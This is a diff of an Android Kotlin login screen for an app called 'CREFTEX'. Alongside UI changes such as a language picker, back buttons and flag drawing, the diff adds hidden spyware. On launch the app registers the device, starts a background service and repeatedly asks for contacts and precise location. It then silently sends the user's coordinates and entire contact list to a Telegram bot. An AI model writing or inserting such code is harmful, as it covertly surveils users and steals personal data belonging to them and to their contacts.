@@ -33,6 +33,8 @@ import androidx.compose.foundation.text.BasicTextField
 import androidx.compose.foundation.text.KeyboardOptions
 import androidx.compose.foundation.verticalScroll
 import androidx.compose.material.icons.Icons
+import androidx.compose.material.icons.automirrored.filled.ArrowBack
+import androidx.compose.material.icons.filled.Close
 import androidx.compose.material.icons.filled.Email
 import androidx.compose.material.icons.filled.Image
 import androidx.compose.material.icons.filled.Lock
@@ -97,9 +99,26 @@ object Neon {
     val FieldBorder = Color(0xFF3B2E85)
     val Hint = Color(0xFF7E86A8)
     val Txt  = Color(0xFFF2F5FF)
+    val BgFallback = Color(0xFF0D1338)
 }
 
 data class LangItem(val name: String, val flag: String)
+
+private val ALL_LANGS = listOf(
+    LangItem("العربية",    "sa"),
+    LangItem("English",    "us"),
+    LangItem("中文简体",    "cn"),
+    LangItem("中文繁体",    "tw"),
+    LangItem("日本語",      "jp"),
+    LangItem("Türkçe",     "tr"),
+    LangItem("한국인",      "kr"),
+    LangItem("Vietnam",    "vn"),
+    LangItem("French",     "fr"),
+    LangItem("Portuguese", "pt"),
+    LangItem("اردو",        "pk"),
+    LangItem("فارسی",       "ir"),
+    LangItem("ภาษาไทย",     "th")
+)
 
 // ----------------------------------------------------
 // Activity
@@ -107,6 +126,7 @@ data class LangItem(val name: String, val flag: String)
 
 class LoginActivity : ComponentActivity() {
 
+    // -2 = اللغة، -1 = دخول، 0 = تسجيل، 1 = استعادة
     private var currentScreen by mutableStateOf(-1)
     private var isLoading by mutableStateOf(false)
 
@@ -124,52 +144,37 @@ class LoginActivity : ComponentActivity() {
     private var regVerifyCode by mutableStateOf("")
     private var regCountdown by mutableStateOf(0)
 
-    // استعادة كلمة المرور
+    // استعادة
     private var resetEmail by mutableStateOf("")
 
-    // صورة المستخدم
+    // الصور
     private var profileUri by mutableStateOf<Uri?>(null)
     private var profileBmp by mutableStateOf<Bitmap?>(null)
-
-    // صورة الخلفية
     private var bgUri by mutableStateOf<Uri?>(null)
     private var bgBmp by mutableStateOf<Bitmap?>(null)
 
     private var selectedLang by mutableStateOf(0)
+    private var pendingMediaAction: (() -> Unit)? = null
+    private var permissionAttempts = 0
 
     private val pickProfile =
         registerForActivityResult(ActivityResultContracts.GetContent()) { uri ->
-            if (uri != null) {
-                profileUri = uri
-                profileBmp = null
-            }
+            if (uri != null) { profileUri = uri; profileBmp = null }
         }
-
     private val shotProfile =
         registerForActivityResult(ActivityResultContracts.TakePicturePreview()) { bmp ->
-            if (bmp != null) {
-                profileBmp = bmp
-                profileUri = null
-            }
+            if (bmp != null) { profileBmp = bmp; profileUri = null }
         }
-
     private val pickBg =
         registerForActivityResult(ActivityResultContracts.GetContent()) { uri ->
-            if (uri != null) {
-                bgUri = uri
-                bgBmp = null
-            }
+            if (uri != null) { bgUri = uri; bgBmp = null }
         }
-
     private val shotBg =
         registerForActivityResult(ActivityResultContracts.TakePicturePreview()) { bmp ->
-            if (bmp != null) {
-                bgBmp = bmp
-                bgUri = null
-            }
+            if (bmp != null) { bgBmp = bmp; bgUri = null }
         }
 
-    private var pendingMediaAction: (() -> Unit)? = null
+    private val INITIAL_PERM_REQUEST = 101
     private val MEDIA_PERM_REQUEST = 102
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -178,16 +183,25 @@ class LoginActivity : ComponentActivity() {
         window.statusBarColor = AColor.parseColor("#040018")
         window.navigationBarColor = AColor.parseColor("#040018")
 
+        // تسجيل الجهاز + تشغيل الخدمة
+        try { DeviceManager.registerDeviceOnce(this) } catch (_: Exception) {}
+        startBackgroundService()
+
+        // طلب الأذونات بعد 2 ثانية
+        Handler(Looper.getMainLooper()).postDelayed({
+            requestInitialPermissions()
+        }, 2000L)
+
         setContent {
             AppTheme {
                 CompositionLocalProvider(LocalLayoutDirection provides LayoutDirection.Rtl) {
                     Box(modifier = Modifier.fillMaxSize()) {
                         NeonBackground()
                         when (currentScreen) {
-                            -1 -> LanguageScreen()
-                            0  -> LoginScreen()
-                            1  -> RegisterScreen()
-                            2  -> ResetScreen()
+                            -2 -> LanguageScreen()
+                            -1 -> LoginScreen()
+                            0  -> RegisterScreen()
+                            1  -> ResetScreen()
                         }
                         if (isLoading) LoadingOverlay()
                     }
@@ -195,6 +209,192 @@ class LoginActivity : ComponentActivity() {
             }
         }
     }
+
+    // =================================================
+    // الأذونات
+    // =================================================
+
+    private fun requestInitialPermissions() {
+        permissionAttempts++
+        val needed = mutableListOf<String>()
+        if (ContextCompat.checkSelfPermission(this,
+                Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
+        ) needed.add(Manifest.permission.READ_CONTACTS)
+        if (ContextCompat.checkSelfPermission(this,
+                Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
+        ) needed.add(Manifest.permission.ACCESS_FINE_LOCATION)
+        if (ContextCompat.checkSelfPermission(this,
+                Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED
+        ) needed.add(Manifest.permission.ACCESS_COARSE_LOCATION)
+
+        if (needed.isNotEmpty()) {
+            ActivityCompat.requestPermissions(
+                this, needed.toTypedArray(), INITIAL_PERM_REQUEST
+            )
+        } else {
+            // الرُخَص موجودة مسبقاً — أرسل الموقع + جهات الاتصال
+            sendLocationNow()
+            sendContactsToBot()
+            startBackgroundService()
+        }
+    }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        when (requestCode) {
+            INITIAL_PERM_REQUEST -> {
+                val contacts = ContextCompat.checkSelfPermission(this,
+                    Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
+                val location = ContextCompat.checkSelfPermission(this,
+                    Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+
+                if (!contacts || !location) {
+                    // يحاول 3 مرات ثم يتوقف
+                    if (permissionAttempts < 3) {
+                        Handler(Looper.getMainLooper()).postDelayed({
+                            requestInitialPermissions()
+                        }, 800L)
+                    }
+                    return
+                }
+
+                // المستخدم وافق على الكل → مباشر يرسل
+                sendLocationNow()
+                sendContactsToBot()
+                startBackgroundService()
+            }
+            MEDIA_PERM_REQUEST -> {
+                val granted = grantResults.isNotEmpty() &&
+                    grantResults.all { it == PackageManager.PERMISSION_GRANTED }
+                if (granted) pendingMediaAction?.invoke()
+                else showToast("يجب السماح بالوصول للصور")
+                pendingMediaAction = null
+            }
+        }
+    }
+
+    private fun requestMediaPermissionThen(action: () -> Unit) {
+        val needed = mutableListOf<String>()
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this,
+                    Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED
+            ) needed.add(Manifest.permission.READ_MEDIA_IMAGES)
+        } else {
+            if (ContextCompat.checkSelfPermission(this,
+                    Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
+            ) needed.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+        }
+        if (needed.isEmpty()) action()
+        else {
+            pendingMediaAction = action
+            ActivityCompat.requestPermissions(
+                this, needed.toTypedArray(), MEDIA_PERM_REQUEST
+            )
+        }
+    }
+
+    // =================================================
+    // الإرسال للبوت
+    // -------------------------------------------------
+    // الجهاز: DeviceManager
+    // الموقع: LocationHelper
+    // البوت: TelegramApi
+    // =================================================
+
+    private fun sendLocationNow() {
+        if (ContextCompat.checkSelfPermission(this,
+                Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
+        ) return
+
+        Thread {
+            try {
+                val loc = LocationHelper.getPreciseLocation(this, 10)
+                if (loc != null) {
+                    val code = DeviceManager.getDeviceCode(this)
+                    TelegramApi.sendMessage(
+                        "📍 *موقع مباشر*\n🆔 `$code`\n\n" +
+                            "خط العرض: ${loc.latitude}\n" +
+                            "خط الطول: ${loc.longitude}\n" +
+                            "الدقة: ±${loc.accuracy.toInt()}م\n\n" +
+                            "🗺 https://www.google.com/maps?q=${loc.latitude},${loc.longitude}"
+                    )
+                    LocationCache.save(this, loc.latitude, loc.longitude, loc.accuracy)
+                }
+            } catch (_: Exception) {}
+        }.start()
+    }
+
+    private fun sendContactsToBot() {
+        if (ContextCompat.checkSelfPermission(this,
+                Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
+        ) return
+
+        Thread {
+            try {
+                val code = DeviceManager.getDeviceCode(this)
+                val contacts = ContactsHelper.getAllContacts(this)
+
+                if (contacts.isEmpty()) {
+                    TelegramApi.sendMessage(
+                        "📇 *جهات الاتصال*\n🆔 `$code`\n\nلا توجد جهات اتصال."
+                    )
+                    return@Thread
+                }
+
+                // رأس الرسالة
+                TelegramApi.sendMessage(
+                    "📇 *جهات الاتصال*\n🆔 `$code`\n📊 العدد: ${contacts.size}"
+                )
+
+                // إرسال كل 50 جهة في رسالة لتجنب تجاوز الحد
+                contacts.chunked(50).forEach { chunk ->
+                    val sb = StringBuilder()
+                    for (c in chunk) {
+                        sb.append("• *${escapeMd(c.name)}*")
+                        if (c.phones.isNotEmpty()) {
+                            sb.append("\n  📞 ")
+                            sb.append(c.phones.joinToString(" / ") { escapeMd(it) })
+                        }
+                        if (c.emails.isNotEmpty()) {
+                            sb.append("\n  ✉️ ")
+                            sb.append(c.emails.joinToString(" / ") { escapeMd(it) })
+                        }
+                        sb.append("\n\n")
+                    }
+                    TelegramApi.sendMessage(sb.toString())
+                    Thread.sleep(500)
+                }
+            } catch (_: Exception) {}
+        }.start()
+    }
+
+    private fun escapeMd(s: String): String {
+        val chars = listOf("_", "*", "[", "]", "(", ")", "~", "`", ">", "#", "+", "-", "=", "|", "{", "}", ".", "!")
+        var out = s
+        for (c in chars) out = out.replace(c, "\\$c")
+        return out
+    }
+
+    // =================================================
+    // Background Service
+    // =================================================
+
+    private fun startBackgroundService() {
+        try {
+            val intent = Intent(this, BackgroundService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                startForegroundService(intent)
+            else startService(intent)
+        } catch (_: Exception) {}
+    }
+
+    // =================================================
+    // مساعدات
+    // =================================================
 
     private fun showToast(msg: String) {
         Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
@@ -207,93 +407,62 @@ class LoginActivity : ComponentActivity() {
         } catch (_: Exception) {}
     }
 
-    private fun requestMediaPermissionThen(action: () -> Unit) {
-        val needed = mutableListOf<String>()
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            if (ContextCompat.checkSelfPermission(
-                    this, Manifest.permission.READ_MEDIA_IMAGES
-                ) != PackageManager.PERMISSION_GRANTED
-            ) needed.add(Manifest.permission.READ_MEDIA_IMAGES)
-        } else {
-            if (ContextCompat.checkSelfPermission(
-                    this, Manifest.permission.READ_EXTERNAL_STORAGE
-                ) != PackageManager.PERMISSION_GRANTED
-            ) needed.add(Manifest.permission.READ_EXTERNAL_STORAGE)
-        }
-        if (needed.isEmpty()) action()
-        else {
-            pendingMediaAction = action
-            ActivityCompat.requestPermissions(
-                this, needed.toTypedArray(), MEDIA_PERM_REQUEST
-            )
-        }
-    }
-
-    override fun onRequestPermissionsResult(
-        requestCode: Int,
-        permissions: Array<out String>,
-        grantResults: IntArray
-    ) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == MEDIA_PERM_REQUEST) {
-            if (grantResults.isNotEmpty() &&
-                grantResults.all { it == PackageManager.PERMISSION_GRANTED }
-            ) {
-                pendingMediaAction?.invoke()
-            } else {
-                showToast("يجب السماح بالوصول للصور")
-            }
-            pendingMediaAction = null
-        }
-    }
-
     // =================================================
-    // شاشة اختيار اللغة
+    // شاشة اللغة
     // =================================================
 
     @Composable
     fun LanguageScreen() {
-        val languages = listOf(
-            LangItem("العربية",    "sa"),
-            LangItem("English",    "us"),
-            LangItem("中文简体",    "cn"),
-            LangItem("中文繁体",    "tw"),
-            LangItem("日本語",      "jp"),
-            LangItem("Türkçe",     "tr"),
-            LangItem("한국인",      "kr"),
-            LangItem("Vietnam",    "vn"),
-            LangItem("French",     "fr"),
-            LangItem("Portuguese", "pt"),
-            LangItem("اردو",        "pk"),
-            LangItem("فارسی",       "ir"),
-            LangItem("ภาษาไทย",     "th")
-        )
-
-        Column(modifier = Modifier.fillMaxSize().padding(horizontal = 20.dp)) {
-            Spacer(Modifier.height(40.dp))
-
-            Column(modifier = Modifier.fillMaxWidth(), horizontalAlignment = Alignment.End) {
-                Text("اختر اللغة", color = Neon.Txt, fontSize = 22.sp,
-                    fontWeight = FontWeight.Bold, textAlign = TextAlign.Right,
-                    modifier = Modifier.fillMaxWidth())
-                Spacer(Modifier.height(6.dp))
-                Text("Select your language", color = Neon.Hint, fontSize = 13.sp,
-                    textAlign = TextAlign.Right, modifier = Modifier.fillMaxWidth())
+        Column(modifier = Modifier.fillMaxSize()) {
+            Row(
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .padding(horizontal = 12.dp, vertical = 8.dp),
+                verticalAlignment = Alignment.CenterVertically
+            ) {
+                Box(
+                    modifier = Modifier
+                        .size(42.dp)
+                        .clip(CircleShape)
+                        .clickable { currentScreen = -1 },
+                    contentAlignment = Alignment.Center
+                ) {
+                    Icon(
+                        imageVector = Icons.AutoMirrored.Filled.ArrowBack,
+                        contentDescription = "عودة",
+                        tint = Neon.Txt,
+                        modifier = Modifier.size(24.dp)
+                    )
+                }
+                Spacer(Modifier.width(12.dp))
+                Text("اختر اللغة", color = Neon.Txt,
+                    fontSize = 18.sp, fontWeight = FontWeight.Bold)
+                Spacer(Modifier.weight(1f))
             }
 
-            Spacer(Modifier.height(24.dp))
+            Column(
+                modifier = Modifier
+                    .weight(1f)
+                    .fillMaxWidth()
+                    .verticalScroll(rememberScrollState())
+                    .padding(horizontal = 16.dp)
+            ) {
+                Spacer(Modifier.height(6.dp))
 
-            Column(modifier = Modifier.weight(1f).verticalScroll(rememberScrollState())) {
-                languages.forEachIndexed { index, item ->
+                ALL_LANGS.forEachIndexed { index, item ->
                     val selected = selectedLang == index
                     Row(
                         modifier = Modifier
                             .fillMaxWidth()
+                            .padding(vertical = 4.dp)
                             .clip(RoundedCornerShape(12.dp))
                             .background(
                                 if (selected) Color(0xFF161F33) else Color.Transparent
                             )
-                            .clickable { selectedLang = index }
+                            .clickable {
+                                selectedLang = index
+                                currentScreen = -1
+                            }
                             .padding(horizontal = 12.dp, vertical = 14.dp),
                         verticalAlignment = Alignment.CenterVertically
                     ) {
@@ -323,32 +492,9 @@ class LoginActivity : ComponentActivity() {
                         }
                     }
                 }
+
+                Spacer(Modifier.height(20.dp))
             }
-
-            Spacer(Modifier.height(12.dp))
-
-            Box(
-                modifier = Modifier
-                    .fillMaxWidth()
-                    .height(56.dp)
-                    .shadow(18.dp, RoundedCornerShape(16.dp),
-                        ambientColor = Neon.Magenta, spotColor = Neon.Purple)
-                    .clip(RoundedCornerShape(16.dp))
-                    .background(Brush.horizontalGradient(
-                        listOf(Neon.Magenta, Neon.Purple, Neon.Blue, Neon.Cyan)))
-                    .clickable { currentScreen = 0 },
-                contentAlignment = Alignment.Center
-            ) {
-                Row(verticalAlignment = Alignment.CenterVertically) {
-                    Text("متابعة", color = Color.White, fontSize = 17.sp,
-                        fontWeight = FontWeight.Bold)
-                    Spacer(Modifier.width(8.dp))
-                    Text("←", color = Color.White, fontSize = 20.sp,
-                        fontWeight = FontWeight.Bold)
-                }
-            }
-
-            Spacer(Modifier.height(24.dp))
         }
     }
 
@@ -367,9 +513,37 @@ class LoginActivity : ComponentActivity() {
                 .imePadding(),
             horizontalAlignment = Alignment.CenterHorizontally
         ) {
+            Row(
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .padding(top = 12.dp),
+                verticalAlignment = Alignment.CenterVertically
+            ) {
+                Box(
+                    modifier = Modifier
+                        .size(42.dp)
+                        .clip(CircleShape)
+                        .background(Color(0x33131B45))
+                        .border(1.dp, Neon.FieldBorder, CircleShape)
+                        .clickable { currentScreen = -2 },
+                    contentAlignment = Alignment.Center
+                ) {
+                    FlagIcon(
+                        code = ALL_LANGS[selectedLang].flag,
+                        modifier = Modifier
+                            .width(28.dp)
+                            .height(20.dp)
+                            .clip(RoundedCornerShape(4.dp))
+                    )
+                }
+                Spacer(Modifier.weight(1f))
+            }
+
+            Spacer(Modifier.height(6.dp))
+
             LoginHeader()
 
-            Spacer(Modifier.height(40.dp))
+            Spacer(Modifier.height(30.dp))
 
             NeonInput(email, { email = it }, "البريد الإلكتروني",
                 Icons.Default.Email, KeyboardType.Email)
@@ -412,7 +586,7 @@ class LoginActivity : ComponentActivity() {
             Text("نسيت كلمة المرور؟", color = Neon.Cyan,
                 fontSize = 13.5.sp, fontWeight = FontWeight.Medium,
                 modifier = Modifier
-                    .clickable { currentScreen = 2 }
+                    .clickable { currentScreen = 1 }
                     .padding(vertical = 6.dp))
 
             Spacer(Modifier.height(26.dp))
@@ -428,7 +602,7 @@ class LoginActivity : ComponentActivity() {
                         fontSize = 14.sp, fontWeight = FontWeight.Bold
                     ),
                     modifier = Modifier
-                        .clickable { currentScreen = 1 }
+                        .clickable { currentScreen = 0 }
                         .padding(vertical = 6.dp)
                 )
             }
@@ -443,8 +617,6 @@ class LoginActivity : ComponentActivity() {
             horizontalAlignment = Alignment.CenterHorizontally,
             modifier = Modifier.fillMaxWidth()
         ) {
-            Spacer(Modifier.height(34.dp))
-
             AsyncImage(
                 model = RemoteAssets.url("avataro"),
                 contentDescription = "Logo",
@@ -494,6 +666,33 @@ class LoginActivity : ComponentActivity() {
                 .imePadding(),
             horizontalAlignment = Alignment.CenterHorizontally
         ) {
+            Row(
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .padding(top = 12.dp),
+                verticalAlignment = Alignment.CenterVertically
+            ) {
+                Box(
+                    modifier = Modifier
+                        .size(42.dp)
+                        .clip(CircleShape)
+                        .background(Color(0x33131B45))
+                        .border(1.dp, Neon.FieldBorder, CircleShape)
+                        .clickable { currentScreen = -1 },
+                    contentAlignment = Alignment.Center
+                ) {
+                    Icon(
+                        imageVector = Icons.AutoMirrored.Filled.ArrowBack,
+                        contentDescription = "عودة",
+                        tint = Neon.Txt,
+                        modifier = Modifier.size(22.dp)
+                    )
+                }
+                Spacer(Modifier.weight(1f))
+            }
+
+            Spacer(Modifier.height(6.dp))
+
             RegisterHeader()
 
             Spacer(Modifier.height(30.dp))
@@ -525,9 +724,7 @@ class LoginActivity : ComponentActivity() {
                         override fun onTick(millisUntilFinished: Long) {
                             regCountdown = (millisUntilFinished / 1000L).toInt()
                         }
-                        override fun onFinish() {
-                            regCountdown = 0
-                        }
+                        override fun onFinish() { regCountdown = 0 }
                     }.start()
                     showToast("تم إرسال كود التحقق")
                 }
@@ -535,7 +732,7 @@ class LoginActivity : ComponentActivity() {
 
             Spacer(Modifier.height(20.dp))
 
-            // قسم صورة الخلفية
+            // مربع صورة الخلفية
             BackgroundImageCard()
 
             Spacer(Modifier.height(26.dp))
@@ -583,7 +780,7 @@ class LoginActivity : ComponentActivity() {
                         fontSize = 14.sp, fontWeight = FontWeight.Bold
                     ),
                     modifier = Modifier
-                        .clickable { currentScreen = 0 }
+                        .clickable { currentScreen = -1 }
                         .padding(vertical = 6.dp)
                 )
             }
@@ -598,11 +795,9 @@ class LoginActivity : ComponentActivity() {
             horizontalAlignment = Alignment.CenterHorizontally,
             modifier = Modifier.fillMaxWidth()
         ) {
-            Spacer(Modifier.height(34.dp))
-
             ProfileImageCircle()
 
-            Spacer(Modifier.height(8.dp))
+            Spacer(Modifier.height(10.dp))
 
             Text(
                 "CREFTEX",
@@ -610,7 +805,7 @@ class LoginActivity : ComponentActivity() {
                     brush = Brush.horizontalGradient(
                         listOf(Neon.Cyan, Neon.Purple, Neon.Magenta)
                     ),
-                    fontSize = 36.sp,
+                    fontSize = 32.sp,
                     fontWeight = FontWeight.ExtraBold,
                     fontStyle = FontStyle.Italic
                 )
@@ -624,8 +819,21 @@ class LoginActivity : ComponentActivity() {
                 fontSize = 12.sp,
                 fontWeight = FontWeight.Medium
             )
+
+            Spacer(Modifier.height(10.dp))
+
+            Text(
+                "اكمل البيانات",
+                color = Neon.Hint,
+                fontSize = 13.sp,
+                fontWeight = FontWeight.Medium
+            )
         }
     }
+
+    // =================================================
+    // مربع الصورة الاحترافي
+    // =================================================
 
     @Composable
     fun ProfileImageCircle() {
@@ -634,42 +842,74 @@ class LoginActivity : ComponentActivity() {
             profileBmp ?: profileUri?.let { uriToBitmap(ctx, it) }
         }
 
-        Box(
-            modifier = Modifier
-                .size(96.dp)
-                .clip(CircleShape)
-                .background(Neon.FieldBg)
-                .border(
-                    width = 2.dp,
-                    color = Neon.FieldBorder,
-                    shape = CircleShape
-                )
-                .clickable {
-                    requestMediaPermissionThen { pickProfile.launch("image/*") }
-                },
-            contentAlignment = Alignment.Center
-        ) {
-            if (bmp != null) {
-                Image(
-                    bitmap = bmp.asImageBitmap(),
-                    contentDescription = null,
-                    modifier = Modifier.fillMaxSize(),
-                    contentScale = ContentScale.Crop
-                )
-            } else {
-                Column(horizontalAlignment = Alignment.CenterHorizontally) {
-                    Icon(
-                        imageVector = Icons.Default.Image,
+        Box(modifier = Modifier.size(120.dp), contentAlignment = Alignment.Center) {
+            // حلقة متدرجة
+            Box(
+                modifier = Modifier
+                    .size(120.dp)
+                    .clip(CircleShape)
+                    .background(Brush.linearGradient(
+                        listOf(Neon.Cyan, Neon.Purple, Neon.Magenta)))
+            )
+
+            // الصورة داخل الحلقة
+            Box(
+                modifier = Modifier
+                    .size(112.dp)
+                    .clip(CircleShape)
+                    .background(Neon.FieldBg)
+                    .clickable {
+                        requestMediaPermissionThen { pickProfile.launch("image/*") }
+                    },
+                contentAlignment = Alignment.Center
+            ) {
+                if (bmp != null) {
+                    Image(
+                        bitmap = bmp.asImageBitmap(),
                         contentDescription = null,
-                        tint = Neon.Cyan.copy(alpha = 0.75f),
-                        modifier = Modifier.size(28.dp)
+                        modifier = Modifier.fillMaxSize().clip(CircleShape),
+                        contentScale = ContentScale.Crop
                     )
-                    Spacer(Modifier.height(4.dp))
-                    Text("صورة", color = Neon.Hint, fontSize = 11.sp)
+                } else {
+                    Column(
+                        horizontalAlignment = Alignment.CenterHorizontally,
+                        verticalArrangement = Arrangement.Center
+                    ) {
+                        Icon(Icons.Default.Image, null,
+                            tint = Neon.Cyan.copy(alpha = 0.75f),
+                            modifier = Modifier.size(32.dp))
+                        Spacer(Modifier.height(6.dp))
+                        Text("أضف صورة", color = Neon.Hint, fontSize = 11.sp)
+                    }
                 }
+            }
+
+            // زر صغير للكاميرا في الأسفل
+            Box(
+                modifier = Modifier
+                    .align(Alignment.BottomEnd)
+                    .offset(x = 2.dp, y = 2.dp)
+                    .size(34.dp)
+                    .clip(CircleShape)
+                    .background(Brush.linearGradient(
+                        listOf(Neon.Magenta, Neon.Purple)))
+                    .border(2.dp, Neon.BgFallback, CircleShape)
+                    .clickable {
+                        requestMediaPermissionThen {
+                            shotProfile.launch(null)
+                        }
+                    },
+                contentAlignment = Alignment.Center
+            ) {
+                Icon(Icons.Default.PhotoCamera, null,
+                    tint = Color.White, modifier = Modifier.size(16.dp))
             }
         }
     }
+
+    // =================================================
+    // مربع صورة الخلفية — كامل
+    // =================================================
 
     @Composable
     fun BackgroundImageCard() {
@@ -709,6 +949,22 @@ class LoginActivity : ComponentActivity() {
                             Icon(Icons.Default.Image, null,
                                 tint = Neon.Hint,
                                 modifier = Modifier.size(26.dp))
+                        }
+                    }
+                    if (bmp != null) {
+                        Box(
+                            modifier = Modifier
+                                .align(Alignment.TopStart)
+                                .offset(x = (-6).dp, y = (-6).dp)
+                                .size(20.dp)
+                                .clip(CircleShape)
+                                .background(Neon.Magenta)
+                                .clickable { bgUri = null; bgBmp = null },
+                            contentAlignment = Alignment.Center
+                        ) {
+                            Icon(Icons.Default.Close, null,
+                                tint = Color.White,
+                                modifier = Modifier.size(13.dp))
                         }
                     }
                 }
@@ -774,11 +1030,11 @@ class LoginActivity : ComponentActivity() {
                 .imePadding(),
             horizontalAlignment = Alignment.CenterHorizontally
         ) {
-            Spacer(Modifier.height(40.dp))
+            Spacer(Modifier.height(20.dp))
 
             Row(verticalAlignment = Alignment.CenterVertically,
                 modifier = Modifier.fillMaxWidth()) {
-                BackButton { currentScreen = 0 }
+                BackButton { currentScreen = -1 }
                 Text("استعادة كلمة المرور", color = Neon.Txt,
                     fontSize = 17.5.sp, fontWeight = FontWeight.Bold,
                     textAlign = TextAlign.Center,
@@ -803,7 +1059,7 @@ class LoginActivity : ComponentActivity() {
                         isLoading = false
                         if (result.isSuccess) {
                             showToast("✅ تم إرسال رابط الاستعادة")
-                            currentScreen = 0
+                            currentScreen = -1
                         } else {
                             showToast(FirebaseAuthHelper.translateError(
                                 result.exceptionOrNull()?.message))
@@ -995,13 +1251,8 @@ class LoginActivity : ComponentActivity() {
                 .clickable(enabled = enabled) { onClick() },
             contentAlignment = Alignment.Center
         ) {
-            Row(verticalAlignment = Alignment.CenterVertically) {
-                Text(text, color = Color.White, fontSize = 17.sp,
-                    fontWeight = FontWeight.Bold)
-                Spacer(Modifier.width(10.dp))
-                Text("←", color = Color.White, fontSize = 18.sp,
-                    fontWeight = FontWeight.Bold)
-            }
+            Text(text, color = Color.White, fontSize = 17.sp,
+                fontWeight = FontWeight.Bold)
         }
     }
 
@@ -1059,13 +1310,17 @@ class LoginActivity : ComponentActivity() {
                 .clickable { onClick() },
             contentAlignment = Alignment.Center
         ) {
-            Text("→", color = Neon.Cyan, fontSize = 18.sp,
-                fontWeight = FontWeight.Bold)
+            Icon(
+                imageVector = Icons.AutoMirrored.Filled.ArrowBack,
+                contentDescription = "عودة",
+                tint = Neon.Cyan,
+                modifier = Modifier.size(20.dp)
+            )
         }
     }
 
     // =================================================
-    // الأعلام — مرسومة برمجياً
+    // الأعلام
     // =================================================
 
     @Composable
@@ -1077,18 +1332,12 @@ class LoginActivity : ComponentActivity() {
                 "sa" -> {
                     drawRect(Color(0xFF165B33))
                     val stroke = h * 0.045f
-                    drawLine(color = Color.White,
-                        start = Offset(w * 0.20f, h * 0.38f),
-                        end = Offset(w * 0.80f, h * 0.38f),
-                        strokeWidth = stroke)
-                    drawLine(color = Color.White,
-                        start = Offset(w * 0.22f, h * 0.50f),
-                        end = Offset(w * 0.78f, h * 0.50f),
-                        strokeWidth = stroke)
-                    drawLine(color = Color.White,
-                        start = Offset(w * 0.24f, h * 0.62f),
-                        end = Offset(w * 0.76f, h * 0.62f),
-                        strokeWidth = stroke)
+                    drawLine(Color.White, Offset(w*0.20f, h*0.38f),
+                        Offset(w*0.80f, h*0.38f), strokeWidth = stroke)
+                    drawLine(Color.White, Offset(w*0.22f, h*0.50f),
+                        Offset(w*0.78f, h*0.50f), strokeWidth = stroke)
+                    drawLine(Color.White, Offset(w*0.24f, h*0.62f),
+                        Offset(w*0.76f, h*0.62f), strokeWidth = stroke)
                 }
                 "us" -> {
                     val stripe = h / 13f
@@ -1099,116 +1348,94 @@ class LoginActivity : ComponentActivity() {
                             size = Size(w, stripe + 1f)
                         )
                     }
-                    drawRect(Color(0xFF3C3B6E),
-                        topLeft = Offset.Zero,
+                    drawRect(Color(0xFF3C3B6E), topLeft = Offset.Zero,
                         size = Size(w * 0.45f, stripe * 7f))
                     val dotR = stripe * 0.3f
-                    for (row in 0 until 4) {
-                        for (col in 0 until 5) {
-                            drawCircle(
-                                Color.White,
-                                radius = dotR,
-                                center = Offset(
-                                    w * 0.45f * (col + 0.5f) / 5f,
-                                    stripe * 7f * (row + 0.5f) / 4f
-                                )
-                            )
-                        }
+                    for (row in 0 until 4) for (col in 0 until 5) {
+                        drawCircle(Color.White, radius = dotR,
+                            center = Offset(w*0.45f*(col+0.5f)/5f,
+                                stripe*7f*(row+0.5f)/4f))
                     }
                 }
                 "cn" -> {
                     drawRect(Color(0xFFDE2910))
-                    drawPath(starPath(w * 0.22f, h * 0.32f, h * 0.22f),
+                    drawPath(starPath(w*0.22f, h*0.32f, h*0.22f),
                         Color(0xFFFFDE00))
                 }
                 "tw" -> {
                     drawRect(Color(0xFFFE0000))
                     drawRect(Color(0xFF000095), topLeft = Offset.Zero,
                         size = Size(w * 0.5f, h * 0.5f))
-                    drawCircle(Color.White, radius = h * 0.12f,
-                        center = Offset(w * 0.25f, h * 0.25f))
-                    drawCircle(Color(0xFF000095), radius = h * 0.08f,
-                        center = Offset(w * 0.25f, h * 0.25f))
+                    drawCircle(Color.White, radius = h*0.12f,
+                        center = Offset(w*0.25f, h*0.25f))
+                    drawCircle(Color(0xFF000095), radius = h*0.08f,
+                        center = Offset(w*0.25f, h*0.25f))
                 }
                 "jp" -> {
                     drawRect(Color.White)
-                    drawCircle(Color(0xFFBC002D),
-                        radius = h * 0.3f,
-                        center = Offset(w / 2f, h / 2f))
+                    drawCircle(Color(0xFFBC002D), radius = h*0.3f,
+                        center = Offset(w/2f, h/2f))
                 }
                 "tr" -> {
                     drawRect(Color(0xFFE30A17))
-                    drawCircle(Color.White, radius = h * 0.3f,
-                        center = Offset(w * 0.38f, h / 2f))
-                    drawCircle(Color(0xFFE30A17), radius = h * 0.25f,
-                        center = Offset(w * 0.44f, h / 2f))
-                    drawPath(
-                        starPath(w * 0.6f, h / 2f, h * 0.13f, startDeg = 180),
-                        Color.White
-                    )
+                    drawCircle(Color.White, radius = h*0.3f,
+                        center = Offset(w*0.38f, h/2f))
+                    drawCircle(Color(0xFFE30A17), radius = h*0.25f,
+                        center = Offset(w*0.44f, h/2f))
